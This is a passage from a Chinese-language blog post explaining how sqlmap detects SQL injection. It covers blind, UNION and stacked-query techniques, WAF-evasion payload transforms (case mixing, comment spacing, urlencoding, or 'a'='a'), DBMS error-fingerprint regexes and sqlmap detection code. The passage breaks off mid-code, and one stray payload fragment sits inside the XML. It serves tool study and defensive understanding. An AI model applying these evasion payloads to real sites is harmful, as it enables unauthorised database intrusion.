<h3 id="time-based-blind-or-stacked-queries"><a href="#time-based-blind-or-stacked-queries" class="headerlink" title="time-based blind or stacked queries"></a>time-based blind or stacked queries</h3><p>也被称为全盲SQL注入：SqlMap替换或追加HTTP请求中受影响的参数，构造一个有效的SQL语句字符串包含一个查询，使后端DBMS sleep几秒钟。对于每个HTTP响应，比较其响应时间与原始请求的HTTP响应时间，该工具一个字符一个字符地分析的注入语句的输出。和boolean-based技术一样，同样应用了二分算法(bisection algorithm)。</p>
<h3 id="UNION-query-SQL-injection"><a href="#UNION-query-SQL-injection" class="headerlink" title="UNION query SQL injection"></a>UNION query SQL injection</h3><p>SqlMap 追加受影响的参数一个以UNION ALL SELECT开始的有效的SQL语句字符串。这种技术当Web应用程序页面内将SELECT语句的同一周期输出，或者类似的，网页上的内容中显示查询结果的每一行时有效。SqlMap是还可以利用部分UNION 查询的SQL注入漏洞，当SQL语句的输出不是在一个周期内的，在构造的区域内只有在查询输出的第一项被显示。</p>
<h3 id="Stacked-queries-SQL-injection"><a href="#Stacked-queries-SQL-injection" class="headerlink" title="Stacked queries SQL injection"></a>Stacked queries SQL injection</h3><p>也被称为多语句SQL注入（multiple statements SQL injection）：SqlMap 测试 Web 应用程序是否支持批量叠查询, 然后，它支持的情况下，它附加到HTTP请求中受影响的参数，一个分号（;） 随后的SQL语句会被执行。这种技术在执行 SELECT以外的SQL语句时非常有用，根据后端数据库管理系统的不同用户和会话特权,数据定义和数据操作SQL语句可能导致文件系统的读写访问和操作系统命令执行的。</p>
<h2 id="SQL-Injection-检测的逃逸技术"><a href="#SQL-Injection-检测的逃逸技术" class="headerlink" title="SQL Injection 检测的逃逸技术"></a>SQL Injection 检测的逃逸技术</h2><h3 id="随机大小写"><a href="#随机大小写" class="headerlink" title="随机大小写"></a>随机大小写</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT =&gt; InsERt</span><br></pre></td></tr></table></figure>

<p>支持的数据库类型：</p>
<table>
<thead>
<tr>
<th>数据库</th>
<th>是否支持</th>
</tr>
</thead>
<tbody><tr>
<td>MSSQL</td>
<td>支持</td>
</tr>
<tr>
<td>MySQL</td>
<td>支持</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>支持</td>
</tr>
<tr>
<td>Oracle</td>
<td>支持</td>
</tr>
</tbody></table>
<h3 id="空格用注释替换"><a href="#空格用注释替换" class="headerlink" title="空格用注释替换"></a>空格用注释替换</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id <span class="keyword">FROM</span> users <span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span><span class="comment">/**/</span>id<span class="comment">/**/</span><span class="keyword">FROM</span><span class="comment">/**/</span>users</span><br></pre></td></tr></table></figure>

<p>支持的数据库类型：</p>
<table>
<thead>
<tr>
<th>数据库</th>
<th>是否支持</th>
</tr>
</thead>
<tbody><tr>
<td>MSSQL</td>
<td>支持</td>
</tr>
<tr>
<td>MySQL</td>
<td>支持</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>支持</td>
</tr>
<tr>
<td>Oracle</td>
<td>支持</td>
</tr>
<tr>
<td>Access</td>
<td>不支持</td>
</tr>
</tbody></table>
<p>Oracle 10g 测试</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span> v$version;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BANNER</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">Oracle Database 10g Enterprise Edition Release 10.1.0.3.0 - Prod</span><br><span class="line">PL/SQL Release 10.1.0.3.0 - Production</span><br><span class="line">CORE	10.1.0.3.0	Production</span><br><span class="line">TNS for Linux: Version 10.1.0.3.0 - Production</span><br><span class="line">NLSRTL Version 10.1.0.3.0 - Production</span><br></pre></td></tr></table></figure>

<p>PostgreSQL:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">postgres<span class="operator">=</span># <span class="keyword">select</span><span class="comment">/*abc*/</span>version();</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">                                                               version                                                                </span><br><span class="line">--------------------------------------------------------------------------------------------------------------------</span><br><span class="line"> PostgreSQL 8.1.4 on i686-pc-linux-gnu, compiled by GCC i686-pc-linux-gnu-gcc (GCC) 3.4.6 (Gentoo 3.4.6-r1, ssp-3.4.5-1.0, pie-8.7.9)</span><br></pre></td></tr></table></figure>

<h3 id="随机注释"><a href="#随机注释" class="headerlink" title="随机注释"></a>随机注释</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">IN</span><span class="comment">/**/</span>S<span class="comment">/**/</span>ERT</span><br></pre></td></tr></table></figure>

<p>本身语法不支持，但可以对付不正确的过滤.</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">postgres<span class="operator">=</span># selec<span class="comment">/**/</span>t version();</span><br></pre></td></tr></table></figure>

<p>ERROR:  syntax error at or near “selec” 在字符 1<br>第 1 行: selec&#x2F;**&#x2F;t version();</p>
<p>Oracle:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> sel<span class="comment">/**/</span>ect v$version;</span><br></pre></td></tr></table></figure>

<p>SP2-0734: unknown command beginning “sel&#x2F;**&#x2F;ect…” - rest of line ignored.</p>
<h3 id="空格用-替换"><a href="#空格用-替换" class="headerlink" title="空格用+替换"></a>空格用+替换</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id <span class="keyword">FROM</span> users <span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span><span class="operator">+</span>id<span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>users</span><br></pre></td></tr></table></figure>

<h3 id="随机空格替换"><a href="#随机空格替换" class="headerlink" title="随机空格替换"></a>随机空格替换</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id <span class="keyword">FROM</span> users <span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span>\rid\tFROM\nusers</span><br></pre></td></tr></table></figure>


<table>
<thead>
<tr>
<th>数据库</th>
<th>是否支持</th>
</tr>
</thead>
<tbody><tr>
<td>MSSQL</td>
<td>支持</td>
</tr>
<tr>
<td>Mysql</td>
<td>支持</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>支持</td>
</tr>
<tr>
<td>Oracle</td>
<td>支持</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$echo -e &quot;select\t*from\tv\$version;&quot;| sqlplus &quot;/ as sysdba&quot;</span><br><span class="line"></span><br><span class="line">SQL&gt; </span><br><span class="line">BANNER</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">Oracle Database 10g Enterprise Edition Release 10.1.0.3.0 - Prod</span><br><span class="line">PL/SQL Release 10.1.0.3.0 - Production</span><br><span class="line">CORE	10.1.0.3.0	Production</span><br><span class="line">TNS for Linux: Version 10.1.0.3.0 - Production</span><br><span class="line">NLSRTL Version 10.1.0.3.0 - Production</span><br></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;select\tversion();&quot; | psql -U postgres</span><br><span class="line">                                                               version                                                                </span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"> PostgreSQL 8.1.4 on i686-pc-linux-gnu, compiled by GCC i686-pc-linux-gnu-gcc (GCC) 3.4.6 (Gentoo 3.4.6-r1, ssp-3.4.5-1.0, pie-8.7.9)</span><br></pre></td></tr></table></figure>


<h3 id="urlencode"><a href="#urlencode" class="headerlink" title="urlencode"></a>urlencode</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> FIELD <span class="keyword">FROM</span><span class="operator">%</span><span class="number">20</span><span class="keyword">TABLE</span><span class="string">&#x27; =&gt; &#x27;</span><span class="operator">%</span><span class="number">53</span><span class="operator">%</span><span class="number">45</span><span class="operator">%</span><span class="number">4</span>c<span class="operator">%</span><span class="number">45</span><span class="operator">%</span><span class="number">43</span><span class="operator">%</span><span class="number">54</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">46</span><span class="operator">%</span><span class="number">49</span><span class="operator">%</span><span class="number">45</span><span class="operator">%</span><span class="number">4</span>c<span class="operator">%</span><span class="number">44</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">46</span><span class="operator">%</span><span class="number">52</span><span class="operator">%</span><span class="number">4</span>f<span class="operator">%</span><span class="number">4</span>d<span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">54</span><span class="operator">%</span><span class="number">41</span><span class="operator">%</span><span class="number">42</span><span class="operator">%</span><span class="number">4</span>c<span class="operator">%</span><span class="number">45</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="between-替换"><a href="#between-替换" class="headerlink" title="between 替换"></a>between 替换</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A <span class="operator">&gt;</span> B<span class="string">&#x27; =&gt; &#x27;</span>A <span class="keyword">NOT</span> <span class="keyword">BETWEEN</span> <span class="number">0</span> <span class="keyword">AND</span> B</span><br></pre></td></tr></table></figure>

<h3 id="逃避正则表达式检测"><a href="#逃避正则表达式检测" class="headerlink" title="逃避正则表达式检测"></a>逃避正则表达式检测</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>  使用  <span class="keyword">or</span> <span class="string">&#x27;a&#x27;</span><span class="operator">=</span><span class="string">&#x27;a&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="DBMS分析技术"><a href="#DBMS分析技术" class="headerlink" title="DBMS分析技术"></a>DBMS分析技术</h2><h3 id="通过错误信息分析DBMS"><a href="#通过错误信息分析DBMS" class="headerlink" title="通过错误信息分析DBMS"></a>通过错误信息分析DBMS</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- MySQL --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dbms</span> <span class="attr">value</span>=<span class="string">&quot;MySQL&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;SQL syntax.*MySQL&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;Warning.*mysql_.*&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;valid MySQL result&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;MySqlClient\.&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dbms</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- PostgreSQL --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dbms</span> <span class="attr">value</span>=<span class="string">&quot;PostgreSQL&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;PostgreSQL.*ERROR&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;Warning.*\Wpg_.*&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;valid PostgreSQL result&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;Npgsql\.&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dbms</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Microsoft SQL Server --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dbms</span> <span class="attr">value</span>=<span class="string">&quot;Microsoft SQL Server&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;Driver.* SQL[\-\_\ ]*Server&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;OLE DB.* SQL Server&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;(\W|\A)SQL Server.*Driver&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;Warning.*mssql_.*&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;(\W|\A)SQL Server.*[0-9a-fA-F]&#123;8&#125;&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;Exception Details:.*\WSystem\.Data\.SqlClient\.&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;Exception Details:.*\WRoadhouse\.Cms\.&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dbms</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Microsoft Access --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dbms</span> <span class="attr">value</span>=<span class="string">&quot;Microsoft Access&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;Microsoft Access Driver&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;JET Database Engine&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;Access Database Engine&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dbms</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Oracle --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dbms</span> <span class="attr">value</span>=<span class="string">&quot;Oracle&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;ORA-[0-9][0-9][0-9][0-9]&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;Oracle error&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;Oracle.*Driver&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;Warning.*\Woci_.*&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;Warning.*\Wora_.*&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dbms</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- DB2 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dbms</span> <span class="attr">value</span>=<span class="string">&quot;DB2&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;CLI Driver.*DB2&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;DB2 SQL error&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dbms</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Informix --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dbms</span> <span class="attr">value</span>=<span class="string">&quot;Informix&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;Exception.*Informix&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dbms</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Interbase/Firebird --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dbms</span> <span class="attr">value</span>=<span class="string">&quot;Firebird&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;Dynamic SQL Error&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;Warning.*ibase_.*&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dbms</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- SQLite --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dbms</span> <span class="attr">value</span>=<span class="string">&quot;SQLite&quot;</span>&gt;</span>AND &#x27;[RANDSTR]&#x27;=&#x27;[RANDSTR]</span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;SQLite/JDBCDriver&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;SQLite.Exception&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;System.Data.SQLite.SQLiteException&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;Warning.*sqlite_.*&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;Warning.*SQLite3::&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dbms</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- SAP MaxDB --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dbms</span> <span class="attr">value</span>=<span class="string">&quot;SAP MaxDB&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;SQL error.*POS([0-9]+).*&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;Warning.*maxdb.*&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dbms</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Sybase --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dbms</span> <span class="attr">value</span>=<span class="string">&quot;Sybase&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;Warning.*sybase.*&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;Sybase message&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;Sybase.*Server message.*&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dbms</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Ingres --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dbms</span> <span class="attr">value</span>=<span class="string">&quot;Ingres&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;Warning.*ingres_&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;Ingres SQLSTATE&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error</span> <span class="attr">regexp</span>=<span class="string">&quot;Ingres\W.*Driver&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dbms</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>更详细地需要DBMS fingerprint 识别技术</p>
<h2 id="检测SQL-Injection-的报文"><a href="#检测SQL-Injection-的报文" class="headerlink" title="检测SQL Injection 的报文"></a>检测SQL Injection 的报文</h2><ol>
<li>检查参数是否动态</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">checkDynParam</span>(<span class="params">place, parameter, value</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    This function checks if the url parameter is dynamic. If it is</span></span><br><span class="line"><span class="string">    dynamic, the content of the page differs, otherwise the</span></span><br><span class="line"><span class="string">    dynamicity might depend on another parameter.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    kb.matchRatio = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    infoMsg = <span class="string">&quot;testing if %s parameter &#x27;%s&#x27; is dynamic&quot;</span> % (place, parameter)</span><br><span class="line">    logger.info(infoMsg)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 生成一个随机字符串</span></span><br><span class="line">    randInt = randomInt()</span><br><span class="line">    payload = agent.payload(place, parameter, value, getUnicode(randInt))</span><br><span class="line">    logger.debug(<span class="string">&quot;checkDynParam: %s&quot;</span>, payload)</span><br><span class="line">    dynResult = Request.queryPage(payload, place, raise404=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果和原先页面一样，不是动态参数</span></span><br><span class="line">    <span class="keyword">if</span> <span class="literal">True</span> == dynResult:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    infoMsg = <span class="string">&quot;confirming that %s parameter &#x27;%s&#x27; is dynamic&quot;</span> % (place, parameter)</span><br><span class="line">    logger.info(infoMsg)</span><br><span class="line">    <span class="comment"># 再次检查，确认</span></span><br><span class="line">    randInt = randomInt()</span><br><span class="line">    payload = agent.payload(place, parameter, value, getUnicode(randInt))</span><br><span class="line">    dynResult = Request.queryPage(payload, place, raise404=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">not</span> dynResult</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>启发式检测，长度为10的 “,’, ), ( 随机字符串， 使用python RandomStr, 如果发生已知错误，报可能存在sql injection， 可能的数据库</p>
</li>
<li><p>基于risk 和 level的级别，使用payloads.xml中的报文进行检测</p>
</li>
<li><p>判断url连接是否稳定，连续连接url两次，如果返回内容完全相同，则认为url稳定。</p>
</li>
<li><p>NullConnection <a target="_blank" rel="noopener" href="http://www.wisec.it/sectou.php?id=472f952d79293">http://www.wisec.it/sectou.php?id=472f952d79293</a></p>
</li>
</ol>
<h2 id="怎么判断injected-payload-成功"><a href="#怎么判断injected-payload-成功" class="headerlink" title="怎么判断injected payload 成功"></a>怎么判断injected payload 成功</h2><h3 id="comparison-算法，-boolean-based-blind-SQL-injections"><a href="#comparison-算法，-boolean-based-blind-SQL-injections" class="headerlink" title="comparison 算法， boolean-based blind SQL injections"></a>comparison 算法， boolean-based blind SQL injections</h3><p>使用 difflib.SequenceMatcher, 基于页面相似度如果请求发生错误，所有不正确的请求都认为正确。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 